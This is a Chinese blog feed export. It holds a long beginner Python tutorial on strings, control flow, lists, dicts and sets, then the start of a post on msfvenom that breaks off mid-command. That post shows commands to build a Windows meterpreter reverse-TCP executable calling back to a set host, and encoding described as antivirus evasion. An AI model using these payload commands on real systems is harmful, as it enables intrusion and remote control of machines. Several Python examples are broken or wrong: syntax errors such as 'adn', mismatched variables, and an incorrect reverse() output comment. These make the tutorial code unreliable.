占位符</h4><p><strong>格式化输出字符串:<code>%</code></strong></p><table><thead><tr><th>占位符</th><th>替换内容</th></tr></thead><tbody><tr><td>%d</td><td>整数</td></tr><tr><td>%f</td><td>浮点数</td></tr><tr><td>%s</td><td>字符串</td></tr><tr><td>%x</td><td>十六进制整数</td></tr><tr><td>%%</td><td>输出第二个百分号</td></tr></tbody></table><p>例如：让用户输出用户信息</p><pre><code class="python">name = input(&quot;Name:&quot;)age = input(&quot;Age:&quot;)job = input(&quot;Job:&quot;)hobbie = input(&quot;Hobbie:&quot;)info = &#39;&#39;&#39;------------ info of %s -----------Name  : %sAge   : %sjob   : %sHobbie: %s------------- end -----------------&#39;&#39;&#39; %(name,name,age,job,hobbie)print(info)</code></pre><h4 id="format"><a href="#format" class="headerlink" title="format()"></a>format()</h4><p><strong>格式化输出字符串:<code>format()</code></strong><br>他会用传入的参数一次替换字符串的占位符<code>{0}</code>,<code>{1}</code>….</p><pre><code class="python">name = &#39;admin&#39;print(&#39;{}&#39;.format(name))</code></pre><ul><li>三种玩法</li></ul><pre><code class="python">res=&#39;{} {} {}&#39;.format(&#39;egon&#39;,18,&#39;male&#39;)res=&#39;{1} {0} {1}&#39;.format(&#39;egon&#39;,18,&#39;male&#39;)res=&#39;{name} {age} {sex}&#39;.format(sex=&#39;male&#39;,name=&#39;egon&#39;,age=18)</code></pre><h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><p>转义字符<code>\</code>,可以转义很多字符</p><table><thead><tr><th>转义字符</th><th>含义</th></tr></thead><tbody><tr><td>\n</td><td>换行符</td></tr><tr><td>\t</td><td>制表符</td></tr><tr><td>\</td><td>反斜线”\ “</td></tr></tbody></table><p>如果字符里面很多字符都需要转义,为了简化<br><strong>python还允许用<code>r&#39; &#39;</code>表示<code>&#39; &#39;</code>内部的字符串默认不转义</strong></p><pre><code class="python">print(r&#39;/t&#39;)|</code></pre><p>如果字符串内有很多换行,为了简化<br>python运行用 <code>&#39;&#39;&#39;.......&#39;&#39;&#39;</code>的格式表示多行内容</p><pre><code class="python">print(&#39;&#39;&#39;lin1lin2&#39;&#39;&#39;)</code></pre><p>多行字符串<code>&#39;&#39;&#39;.....&#39;&#39;&#39;</code>,还可以在前面加上<code>r</code>使用</p><h3 id="字符串的切片与索引"><a href="#字符串的切片与索引" class="headerlink" title="字符串的切片与索引"></a>字符串的切片与索引</h3><p><strong>索引</strong></p><ul><li>索引即下标，就是字符串组成的元素从第一个开始，初始索引为0以此类推</li></ul><pre><code class="python">a = &#39;ABCDEFGHIJK&#39;print(a[0])print(a[1])</code></pre><p><strong>切片</strong></p><ul><li>切片就是通过索引（索引:索引:步长）截取字符串的一段，形成新的字符串</li></ul><pre><code class="python">a = &#39;ABCDEFGHIJK&#39;print(a[0:3])print(a[2:5])print(a[0:])    # 默认到最后print(a[0:-1])  # -1就是最后一个</code></pre><h3 id="字符串常用方法"><a href="#字符串常用方法" class="headerlink" title="字符串常用方法"></a>字符串常用方法</h3><ul><li>首字母大写</li></ul><pre><code class="python">capitalize()</code></pre><ul><li>大小写翻转</li></ul><pre><code class="python">swapcase()</code></pre><ul><li>每个单词的首字母大写</li></ul><pre><code class="python">title()</code></pre><ul><li>内容句容，总长度，空白处填充</li></ul><pre><code class="python"># 第二个为填充内容，不填默认为空白center(20,&quot;*&quot;)</code></pre><ul><li>计算长度</li></ul><pre><code class="python">len()</code></pre><ul><li>判断是否以…开头</li></ul><pre><code class="python">startswith()</code></pre><ul><li>判断是否以…结尾</li></ul><pre><code class="python">endswith()</code></pre><ul><li>寻找字符串中的元素是否存在</li></ul><p><strong>find</strong></p><pre><code class="python">find(sub[,start=0[,end=len(S)]])</code></pre><p>参数说明：</p><ul><li>sub  –  指定检索的子字符串</li><li>start –  可选参数，开始索引，默认为0（可单独指定）</li><li>end – 可选参数，结束索引，默认为字符串长度（不能单独指定）</li></ul><blockquote><p>tips：返回子字符串的第一个匹配项出现在字符串中的索引位置，如果没有匹配性则返回-1</p></blockquote><p><strong>index</strong></p><pre><code class="python">index(str, beg=0, end=len(string))</code></pre><p>参数说明：</p><ul><li>sub  –  指定检索的字符串</li><li>beg – 开始索引，默认为0</li><li>end – 结束索引，默认为字符串的长度</li></ul><blockquote><p>tips： 如果包含子字符串返回开始的索引值，否则抛出异常</p></blockquote><ul><li><p>分割</p><pre><code class="python">split()</code></pre></li><li><p>去除首位字符</p><pre><code class="python">strip()</code></pre></li><li><p>替换字符串</p><pre><code class="python">replace(old, new[, max])</code></pre><p>参数说明：</p></li><li><p>old – 将被替换的子字符串</p></li><li><p>new – 新字符串，用于替换old子字符串</p></li><li><p>max – 可选字符串，替换不超过max次</p></li></ul><h2 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h2><p>布尔值只有<code>true</code>和<code>false</code>两种值</p><h2 id="空值"><a href="#空值" class="headerlink" title="空值"></a>空值</h2><p>空值是Python里的一个特殊的值,用<code>None</code>表示<br>None不能理解为0,因为0是有意义的</p><hr><h1 id="0x08-流程控制"><a href="#0x08-流程控制" class="headerlink" title="0x08 流程控制"></a>0x08 流程控制</h1><h2 id="条件判断语句"><a href="#条件判断语句" class="headerlink" title="条件判断语句"></a>条件判断语句</h2><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><pre><code>if (判断条件):    满足条件后要执行的代码</code></pre><p>例如：判断小李的年龄是否为22</p><pre><code class="python">age = 22if (age == 22):    print(&#39;小李的年龄是：%s&#39;%(age))</code></pre><h3 id="if-…else"><a href="#if-…else" class="headerlink" title="if …else"></a>if …else</h3><pre><code>if (条件):    为真则执行这段代码else:    if条件为假执行的代码</code></pre><p>例如：判断小李的年龄是否为22，为真打印，为假输出骗子</p><pre><code class="python">age = 33if (age == 22):    print(&#39;小李的年龄是：%s&#39;%(age))else:    print(&quot;我是骗子，来打我啊&quot;)</code></pre><h3 id="if…else…"><a href="#if…else…" class="headerlink" title="if…else…"></a>if…else…</h3><p>可以有多个分支条件</p><pre><code>if 条件:    满足条件执行代码elif 条件:    上面的条件不满足就走这个elif 条件:    上面的条件不满足就走这个elif 条件:    上面的条件不满足就走这个    else:    上面所有的条件不满足就走这段</code></pre><h2 id="while"><a href="#while" class="headerlink" title="while"></a>while</h2><pre><code>while 条件:    # 循环体    # 如果条件为真，那么循环体则执行    # 如果条件为假，那么循环体不执行</code></pre><h3 id="循环中止语句"><a href="#循环中止语句" class="headerlink" title="循环中止语句"></a>循环中止语句</h3><ul><li><code>break</code>,用于完全结束一个循环，跳出循环体执行循环后面的语句</li></ul><pre><code class="python">count = 0while count &lt;= 100:    print(&quot;loop &quot;,count)    if count == 5:        break    count +=1print(&quot;-----out of while loop ------&quot;)</code></pre><ul><li><code>continue</code>只是终止本次循环，接着还执行后面的循环</li></ul><pre><code class="python">count = 0while &lt;= 100:    count += 1    if count &gt; 5 adn count &lt;95:        continue    print(&quot;loop &quot;,count)print(&quot;-----out of while loop ------&quot;)</code></pre><h3 id="while…else"><a href="#while…else" class="headerlink" title="while…else"></a>while…else</h3><blockquote><p>Tips：当while循环被<code>break</code>打断，就不会执行else的结果</p></blockquote><p>while 后面的else作用是指，当while循环正常执行完，中间没有被break中止的话，就会执行else后面的语句</p><pre><code class="python">count = 0while count &lt;= 5:    count += 1    print(&quot;loop &quot;,count)else:    print(&quot;循环正常执行完&quot;)print(&quot;-----out of while loop ------&quot;)</code></pre><h3 id="while例子"><a href="#while例子" class="headerlink" title="while例子"></a>while例子</h3><ul><li>求 1-100的所有数的和</li></ul><pre><code class="python">i = 0count = 1while i &lt;= 100:    count += i    i += 1print(count)</code></pre><ul><li>输出1-100内的所有奇数</li></ul><pre><code class="python">count = 0while count &lt;= 100:    count += 1    if (count%2 != 0):        print(count)</code></pre><ul><li>输出1-100内所有的偶数</li></ul><pre><code class="python">count = 0while count &lt;= 100:    count += 1    if (count%2 == 0):        print(count)</code></pre><ul><li>求 1-2+3-4+5…9的所有数的和</li></ul><pre><code class="python">count = 0sum = 0while count &lt; 100:    if (count%2 == 0):        sum = sum - count    else:        sum = sum +count    count += 1print(sum)# 说明当count为偶数的时候，进行1-2等运算，若不是偶数，则进行sum+count</code></pre><ul><li>用户登录(三次机会)</li></ul><pre><code class="python">admin = &#39;admin&#39;passwds = &#39;pass&#39;count = 1while count &lt;= 3:    name = input(&quot;name：&quot;)    passwd = input(&quot;password：&quot;)    if ((name == admin) and (passwd == passwds)):        print(&quot;登录成功&quot;)        break    else:        count +=1        print(&quot;\n 用户或密码不正确，请重新输入 \n&quot;)else:    print(&quot;登录失败&quot;)</code></pre><h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h2><p>for循环可以遍历任何序列的项目，如一个列表或者一个字符串</p><pre><code class="python">for ... in ....</code></pre><p>例如：遍历一个python</p><pre><code class="python">a = &#39;python&#39;for i in a:    print(i)</code></pre><hr><h1 id="0x09-运算符"><a href="#0x09-运算符" class="headerlink" title="0x09 运算符"></a>0x09 运算符</h1><h2 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h2><p>这里就不过多说明了，我在这里就列个表</p><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>+</td><td>加</td></tr><tr><td>-</td><td>减</td></tr><tr><td>*</td><td>乘</td></tr><tr><td>/</td><td>除</td></tr><tr><td>%</td><td>取模，返回除法的余数</td></tr><tr><td>**</td><td>幂，返回x的y次幂</td></tr><tr><td>//</td><td>取整除，返回商的整数部分</td></tr></tbody></table><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>==</td><td>等于</td></tr><tr><td>!=</td><td>不等于</td></tr><tr><td>&lt;&gt;</td><td>不等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;=</td><td>大于等于</td></tr><tr><td>&lt;=</td><td>小于等于</td></tr></tbody></table><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>=</td><td>赋值</td></tr><tr><td>+=</td><td>加法赋值运算符</td></tr><tr><td>-=</td><td>减法赋值运算符</td></tr><tr><td>*=</td><td>乘法赋值运算符</td></tr><tr><td>/=</td><td>除法赋值运算符</td></tr><tr><td>%=</td><td>取模赋值运算符</td></tr><tr><td>**=</td><td>幂赋值运算符</td></tr><tr><td>//=</td><td>取整赋值运算符</td></tr></tbody></table><pre><code># 例子c += a  ===&gt; c = c+a</code></pre><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><table><thead><tr><th>运算符</th><th>描述</th><th>返回</th></tr></thead><tbody><tr><td>and</td><td>与</td><td>两边为真，才为真</td></tr><tr><td>or</td><td>或</td><td>只要有一个为真，则为真</td></tr><tr><td>not</td><td>非</td><td>取反，真为假，假为真</td></tr></tbody></table><blockquote><p>tips 1：<code>在没有()的情况下</code>，not优先级高于and，and优先级高于or，即<code>()&gt;not&gt;and&gt;or</code><br>tips 2：布尔值为0，false，不为0，true<br>tips 3：布尔值真假，可以转换为1和0</p></blockquote><p><strong>短路原则</strong></p><ul><li><code>and</code>的第一个条件为假，后面的不管怎样都为假</li><li><code>or</code>的第一个条件为真，湖面的不管为什么都为真</li></ul><pre><code class="python"># x and y ,x 为 true，则返回yprint(1 and 2)  #2# x or y，x为true，则返回xprint(3 or 100 or 5 or 2) # 3</code></pre><hr><h1 id="0x10-元组（tupe）"><a href="#0x10-元组（tupe）" class="headerlink" title="0x10 元组（tupe）"></a>0x10 元组（tupe）</h1><p><code>元组</code>被称为只读列表，即数据可以被查询，但不能被修改</p><ul><li>定义一个空的tuple,可以写成<code>()</code>,只有一个元素的tuple定义时必须加一个逗号<code>,</code></li></ul><pre><code class="python">x =() #定义空的tuplex = (1,) print(x)</code></pre><p><strong>tuple一旦初始化就不能修改</strong></p><pre><code class="python">x = (&#39;Michael&#39;, &#39;Bob&#39;, &#39;Tracy&#39;)t = (&#39;a&#39;, &#39;b&#39;, [&#39;A&#39;, &#39;B&#39;])t[2][0] = &#39;X&#39;t[2][1] = &#39;Y&#39;</code></pre><ul><li>tuple的陷阱:当你定义一个tuple时,在定义的时候.tuple的元素就必须被确定下来</li></ul><p><strong>修改元组中的列表</strong></p><pre><code class="python">a = (1,2,3,4,5,6,[7,8,9,10],11,12,13)a[6][0] = &#39;你大爷&#39;print(a)</code></pre><hr><h1 id="0x11-列表（list）"><a href="#0x11-列表（list）" class="headerlink" title="0x11 列表（list）"></a>0x11 列表（list）</h1><p>list是一种有序的集合,可以随时添加和和删除其中的元素</p><pre><code class="python">x = [&#39;a&#39;,&#39;b&#39;]</code></pre><p>列表的数据项不需要具有相同的类型<br>创建一个列表,只要把逗号分隔额数据项使用方括号括起来即可</p><p>列表可以进行截取,组合等</p><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><p>你可以对列表的数据进行修改或更新</p><ul><li><code>append()</code>方法来添加列表项</li><li><code>insert(位置,&#39;更新的值&#39;)</code>，把元素插入到指定的位置</li><li><code>extend</code>，在列表的末尾一次性追加另一个序列中的多个值</li></ul><pre><code class="python">list1 = [1, 2, 3, 4, 5, 6, 7 ]print(list1)x = list1.insert(8,&quot;next&quot;)print(list1)b = [1,2,3]c = [4,5,6]b.extend(b)#把c的值,添加到b中,创建全新的列表print(a)</code></pre><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><ul><li><code>del</code>语句来删除列表的的元素</li><li><code>pop()</code> 删除list末尾的元素,也可以删除指定位置的元素</li><li><code>clear</code> 清空</li><li><code>remove(&quot;内容&quot;)</code></li></ul><pre><code class="python">list1 = [1, 2, 3, 4, 5, 6, 7 ]del list[2]x  = [1,2,3,4,5,6]print(x.pop())print(x)print(x.pop(0))print(x)</code></pre><h2 id="改-查"><a href="#改-查" class="headerlink" title="改+查"></a>改+查</h2><ul><li>使用下标索引来访问列表中的值,同样你也可以使用方括号的形式截取字符</li><li>切片去查，或者循环去查</li></ul><pre><code class="python">list1 = [&#39;Google&#39;, &#39;Runoob&#39;, 1997, 2000]list2 = [1, 2, 3, 4, 5, 6, 7 ]print(&quot;list1[0]:&quot;,list1[0]) #使用下标获取print(&quot;list2[1:5]: &quot;, list2[1:5]) #通过截取获得##########################################a = [1,2,3,4,5,6]print(a[1:]) #从下标1取到最后print(a[1:-1]) #取倒数第二值print(a[1:-1:1]) #从左到右一个一个去取print(a[1::2]) #从左到右隔一个去取print(a[3::-1])</code></pre><h2 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h2><ul><li><code>count</code>，计算某元素出现的次数</li></ul><pre><code class="python">a = [1,2,3,4,5,6,1,2,2,2,2,2,2].count(2)print(a) #打印a中的2出现的次数</code></pre><ul><li><code>index</code>，用于从列表中找出某个值第一个匹配的索引位置</li></ul><pre><code class="python">a = [&#39;xiaoli&#39;,&#39;jinqi&#39;,&#39;xiaopan&#39;]print(a.index(&#39;xiaopan&#39;))#返回列表中以下标出现的索引值</code></pre><ul><li><code>sort</code>，用于在原位置对列表进行排序</li><li><code>reverse</code>，将列表中的元素反向存放</li></ul><pre><code class="python">a = [2,1,3,4,5]a.sort()# 他没有返回值，所以只能打印aprint(a) # [1, 2, 3, 4, 5]###############################a.reverse()#他也没有返回值，所以只能打印aprint(a)# [5, 4, 3, 1, 2]</code></pre><ul><li>join()</li></ul><p>用于将序列中的元素以指定的字符连接成一个新的字符串</p><pre><code class="python">a = &#39;abcde&#39;print(&#39;*&#39;.join(a))</code></pre><h2 id="嵌套列表"><a href="#嵌套列表" class="headerlink" title="嵌套列表"></a>嵌套列表</h2><p>即在列表里创建其他列表</p><pre><code class="python">a = [1,2,3,4,5,6]b = [7,8,9]x = [a,b]print(x)</code></pre><p>访问嵌套列表中的值</p><pre><code class="python"># 访问字符串中的某个字li = [&#39;asadasd&#39;,&#39;吴越&#39;,&#39;大浪&#39;]print(li[2][1])a = [1,2,3,4,5,6,[7,8,9]]# 访问7print(a[6][0])</code></pre><h2 id="列表操作符"><a href="#列表操作符" class="headerlink" title="列表操作符"></a>列表操作符</h2><ul><li><code>len()</code>   获取长度</li><li><code>+</code>       组合</li><li><code>*</code>       重复</li><li><code>in</code>      元素是否存在于列表中</li><li><code>for x in [1,2,3]:print(x,end=&quot;&quot;)</code>    迭代</li></ul><pre><code class="python">len([1,2,3])name = [1,2,3]+[4,5,6]x = [&quot;HI&quot;]*4print(3 in [1,2,3])print(x)print(name)</code></pre><hr><h1 id="0x12-字典（dict）"><a href="#0x12-字典（dict）" class="headerlink" title="0x12 字典（dict）"></a>0x12 字典（dict）</h1><p>dict在其他语言中也称为map,使用键-值(key-value)存储,具有极快的查找速度</p><p>dict的key必须是不可变对象<br>这是因为dict根据key来计算value的存储位置,如果每次计算相同的key得出的结果结果不同<br>那dict内部就完全混乱了<br>通过key计算位置的算法称为哈希算法(Hash)</p><p>把数据放入dict的方法,除了初始化时指定外,还可以通过key放入</p><pre><code class="python">d = {&#39;Michael&#39;: 95, &#39;Bob&#39;: 75, &#39;Tracy&#39;: 85}d[&#39;admin&#39;]=67print(d)&gt;&gt; {&#39;Michael&#39;: 95, &#39;Bob&#39;: 75, &#39;Tracy&#39;: 85, &#39;admin&#39;: 67}</code></pre><blockquote><p>tips：<code>由于一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉</code></p></blockquote><h2 id="判断key是否存在"><a href="#判断key是否存在" class="headerlink" title="判断key是否存在"></a>判断key是否存在</h2><blockquote><p>tips： 如果key值不存在，dict就会报错，所以报避免key不存在的错误</p></blockquote><ul><li><code>in</code>判断key是否存在</li><li>dict提供的<code>get()</code>方法，如果key不存在，可以返回None，或者自己指定的value</li></ul><pre><code class="python">d = {&#39;Michael&#39;: 95, &#39;Bob&#39;: 75, &#39;Tracy&#39;: 85}print(&quot;rom&quot; in d)print(d.get(&#39;rom&#39;,&quot;不存在&quot;))</code></pre><h2 id="增-1"><a href="#增-1" class="headerlink" title="增"></a>增</h2><ul><li><code>setdefault(key,default=None)</code>，如果键不存在与字典中，将会添加键并将值设为默认值</li></ul><pre><code class="python">d = {&#39;dict&#39;:&#39;字典&#39;,}d[&#39;hello&#39;] = &#39;你好&#39;print(d)dict = {&#39;runoob&#39;: &#39;菜鸟教程&#39;, &#39;google&#39;: &#39;Google 搜索&#39;}print(&quot;Value : %s&quot; % dict.setdefault(&#39;runoob&#39;, None)) #Value : 菜鸟教程print(&quot;Value : %s&quot; % dict.setdefault(&#39;Taobao&#39;, &#39;淘宝&#39;)) #Value : 淘宝print(dict)# {&#39;runoob&#39;: &#39;菜鸟教程&#39;, &#39;google&#39;: &#39;Google 搜索&#39;, &#39;Taobao&#39;: &#39;淘宝&#39;}</code></pre><h2 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h2><ul><li>删除一个key,用<code>pop(key)</code>方法,对应的value也会从dict中删除</li><li><code>clear</code>清空字典</li><li><code>popitem()</code>随机删除字典中的某个键值对，将删除的键值对以元组的形式返回</li></ul><pre><code class="python">d = {&#39;Michael&#39;: 95, &#39;Bob&#39;: 75, &#39;Tracy&#39;: 85}print(d.pop(&#39;Bob&#39;))print(d)&gt;&gt; 75   {&#39;Michael&#39;: 95, &#39;Tracy&#39;: 85}</code></pre><blockquote><p>tips:dict内部存放的顺序和key放入的顺序是没有关系的</p></blockquote><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><p><strong>update</strong></p><pre><code class="python"># 将dict所有的键值对覆盖添加(相同的覆盖，没有的添加)到dic2中dic = {&quot;name&quot;:&quot;jin&quot;,&quot;age&quot;:18,&quot;sex&quot;:&quot;male&quot;}dic2 = {&quot;name&quot;:&quot;alex&quot;,&quot;weight&quot;:75}dic2.update(dic)print(dic2)</code></pre><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><pre><code class="python">dict = {&#39;runoob&#39;: &#39;菜鸟教程&#39;, &#39;google&#39;: &#39;Google 搜索&#39;}value = dict[&quot;google&quot;]print(value) #没有会报错</code></pre><h2 id="其他操作-1"><a href="#其他操作-1" class="headerlink" title="其他操作"></a>其他操作</h2><ul><li><code>items()</code>，返回可遍历的（键,值）元组数组</li></ul><pre><code class="python">dict = {&#39;Google&#39;: &#39;www.google.com&#39;, &#39;Runoob&#39;: &#39;www.runoob.com&#39;, &#39;taobao&#39;: &#39;www.taobao.com&#39;}print(dict.items())for i in dict.items():    print(i)# (&#39;Google&#39;, &#39;www.google.com&#39;)# (&#39;Runoob&#39;, &#39;www.runoob.com&#39;)# (&#39;taobao&#39;, &#39;www.taobao.com&#39;)</code></pre><ul><li><code>values()</code>以列表返回字典中的所有值</li></ul><pre><code class="python">dict = {&#39;Google&#39;: &#39;www.google.com&#39;, &#39;Runoob&#39;: &#39;www.runoob.com&#39;,}print(dict.values())# 返回 ==&gt; dict_values([&#39;www.google.com&#39;, &#39;www.runoob.com&#39;])</code></pre><ul><li><code>keys()</code>以列表返回一个字典所有的键</li></ul><pre><code class="python">dict = {&#39;Name&#39;: &#39;Zara&#39;, &#39;Age&#39;: 7}print &quot;Value : %s&quot; %  dict.keys()</code></pre><h2 id="字典的循环"><a href="#字典的循环" class="headerlink" title="字典的循环"></a>字典的循环</h2><pre><code class="python">dict = {&#39;runoob&#39;: &#39;菜鸟教程&#39;, &#39;google&#39;: &#39;Google 搜索&#39;}# 如果直接循环，默认是直接打印他的键for i in dict:    print(i)# 用元组显示键值for item in dict.items():    print(item)# 分别打印键和值for key,value in dict.items():    print(key,value)</code></pre><h2 id="字典的嵌套"><a href="#字典的嵌套" class="headerlink" title="字典的嵌套"></a>字典的嵌套</h2><pre><code class="python">dic = {    &#39;name&#39;:[&#39;alex&#39;,&#39;wusir&#39;,&#39;taibai&#39;],    &#39;py9&#39;:{        &#39;time&#39;:&#39;123&#39;,        &#39;learn_money&#39;:19800,        &#39;addr&#39;:&#39;CBD&#39;,    },    &#39;age&#39;:21}</code></pre><p><strong>dcit的特点</strong></p><ul><li>查找和插入的速度极快,不会随着key的增加而变慢 </li><li>需要占用大量的内存,内存浪费多</li></ul><hr><h1 id="0x13-Set"><a href="#0x13-Set" class="headerlink" title="0x13 Set"></a>0x13 Set</h1><p>集合是无须的，不重复的数据集合，它里面的元素是可哈希的（不可变类型），但是集合本身是不可哈希（所以集合做不了字典的键）的。</p><ul><li>去重，把一个列表变成集合，就自动去重了</li><li>关系测试，测试两组数据之前的交集，差集，并集等关系</li></ul><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><pre><code class="python">parame = {value,value1,value2,.......}或set(value)</code></pre><h2 id="增-2"><a href="#增-2" class="headerlink" title="增"></a>增</h2><ul><li><code>add()</code>，重复的元素在set中自动被过滤</li><li><code>update()</code></li></ul><pre><code class="python">set1 = {1,2,3,4,5,6,7,8,9}set1.add(123)set1.update(789)print(set1)</code></pre><h2 id="删-1"><a href="#删-1" class="headerlink" title="删"></a>删</h2><ul><li><code>remove()</code>，按元素删除</li><li><code>clear()</code>，清空集合</li><li><code>del</code> 删除整个集合</li><li><code>pop()</code>，随机删除</li></ul><pre><code class="python">set1 = {1,2,3,4,5,6,7,8,9}print(set1.pop())set1.remove(7)print(set1)del set1</code></pre><h2 id="查-1"><a href="#查-1" class="headerlink" title="查"></a>查</h2><p>只能用for去查</p><pre><code class="python">set1 = {1,2,3,4,5,6,7,8,9}for i in set1:    print(i)</code></pre><h2 id="其他操作-2"><a href="#其他操作-2" class="headerlink" title="其他操作"></a>其他操作</h2><ul><li>交集，(<code>&amp;</code>  或者 <code>intersection</code>)，就是两个集合中相同的</li></ul><pre><code class="python">set1 = {1,2,3,4,5}set2 = {4,5,6,7,8}print(set1 &amp; set2)  # {4, 5}print(set1.intersection(set2))  # {4, 5}</code></pre><ul><li>并集，（<code>|</code> 或者 <code>union</code>）,两个集合合并，相同的去掉</li></ul><pre><code class="python">set1 = {1,2,3,4,5}set2 = {4,5,6,7,8}print(set1 | set2)  # {1, 2, 3, 4, 5, 6, 7}print(set2.union(set1))  # {1, 2, 3, 4, 5, 6, 7}</code></pre><ul><li>差集，（<code>-</code> 或者 <code>difference</code>），集合独有的</li></ul><pre><code class="python">set1 = {1,2,3,4,5}set2 = {4,5,6,7,8}print(set1 - set2)  # {1, 2, 3}print(set1.difference(set2))  # {1, 2, 3}</code></pre><ul><li>反交集，（<code>^</code> 或者 <code>symmetric_difference</code>），去掉相同的并返回</li></ul><pre><code class="python">set1 = {1,2,3,4,5}set2 = {4,5,6,7,8}print(set1 ^ set2)  # {1, 2, 3, 6, 7, 8}print(set1.symmetric_difference(set2))  # {1, 2, 3, 6, 7, 8}</code></pre><ul><li>子集与超集</li></ul><p>子集：一个集合包含另一个集合中的所有</p><pre><code class="python">set1 = {1,2,3}set2 = {1,2,3,4,5,6}print(set1 &lt; set2)print(set1.issubset(set2))  # 这两个相同，都是说明set1是set2子集。print(set2 &gt; set1)print(set2.issuperset(set1))  # 这两个相同，都是说明set2是set1超集。</code></pre><ul><li>frozenset不可变集合，让集合变成不可变类型</li></ul><pre><code class="python">s = frozenset(&#39;barry&#39;)print(s,type(s))  # frozenset({&#39;a&#39;, &#39;y&#39;, &#39;b&#39;, &#39;r&#39;}) &lt;class &#39;frozenset&#39;&gt;</code></pre><ul><li>例子：列表去重</li></ul><pre><code class="python">li = [1,1,1,1,1,2,2,2,2,3,4,5,49,9,1]set1 = set(li)li = list(set1)print(li)</code></pre><hr>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【学习篇】msfvenom使用</title>
    <link href="/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/"/>
    <url>/2019/08/19/Linux/kali/msfconsole/msfvenom/msfvenom%E5%90%8E%E9%97%A8%E5%AD%A6%E4%B9%A0-windows%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>msfvenom 是msf框架配套的攻击载荷生成器</p><p>什么是攻击载荷: <code>payload</code> 目标系统上渗透成功后执行的代码</p><a id="more"></a><p>msfvenom命令行选项如下<br><img src="/images/Linux/kali/msfvenom/0.png" srcset="/img/loading.gif" alt=""></p><hr><h2 id="本文仅提供技术参考-请勿用作非法用途-一旦发生后果自负-作者概不负责"><a href="#本文仅提供技术参考-请勿用作非法用途-一旦发生后果自负-作者概不负责" class="headerlink" title="本文仅提供技术参考,请勿用作非法用途,一旦发生后果自负!作者概不负责"></a>本文仅提供技术参考,请勿用作非法用途,一旦发生后果自负!作者概不负责</h2><hr><!--more--><h1 id="p-自定义有效载荷"><a href="#p-自定义有效载荷" class="headerlink" title="-p 自定义有效载荷"></a>-p 自定义有效载荷</h1><p>查看全部有效载荷</p><pre><code>msfvenom -l payload</code></pre><p>查看windows/meterpreter/下的的攻击载荷</p><pre><code>locate windows/meterpreter</code></pre><p>指定有效载荷</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp</code></pre><hr><h1 id="l-载荷列表"><a href="#l-载荷列表" class="headerlink" title="-l 载荷列表"></a>-l 载荷列表</h1><p>模块类型包括:<code>payloads</code>,<code>encoders</code>,<code>nps</code>,<code>all</code></p><p>查看所有</p><pre><code>msfvenom -l</code></pre><hr><h1 id="f-生成文件的格式"><a href="#f-生成文件的格式" class="headerlink" title="-f 生成文件的格式"></a>-f 生成文件的格式</h1><p>指定<code>.exe</code>为有效载荷的格式</p><pre><code>msfvenom -p windows/meterpreter/bind_tcp -f exe</code></pre><p>看支持哪些格式</p><pre><code>Error: Executable formats    asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection, psh-cmd, vba, vba-exe, vba-psh, vbs, warTransform formats    bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript</code></pre><p>正常情况下使用</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=4444 -f exe -o /tmp/x.exe</code></pre><hr><h1 id="a-选择架构平台"><a href="#a-选择架构平台" class="headerlink" title="-a 选择架构平台"></a>-a 选择架构平台</h1><p>–a (–platform)</p><blockquote><p>–arch<br>x86 | x64 | x86_64</p></blockquote><pre><code>--platformwindows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdinetbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe</code></pre><hr><h1 id="e-免杀编码"><a href="#e-免杀编码" class="headerlink" title="-e 免杀编码"></a>-e 免杀编码</h1><p>查看编码的方法</p><pre><code>msfvenom -l encoders</code></pre><p>使用例子</p><pre><code>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</code></pre><hr><h1 id="n-空字段模块-为了绕过和免杀"><a href="#n-空字段模块-为了绕过和免杀" class="headerlink" title="-n 空字段模块/为了绕过和免杀"></a>-n 空字段模块/为了绕过和免杀</h1><p>查看nops选项</p><pre><code>msfvenom -l npos</code></pre><hr><h1 id="s-生成payload的文件大小"><a href="#s-生成payload的文件大小" class="headerlink" title="-s 生成payload的文件大小"></a>-s 生成payload的文件大小</h1><pre><code>msfvenom -p 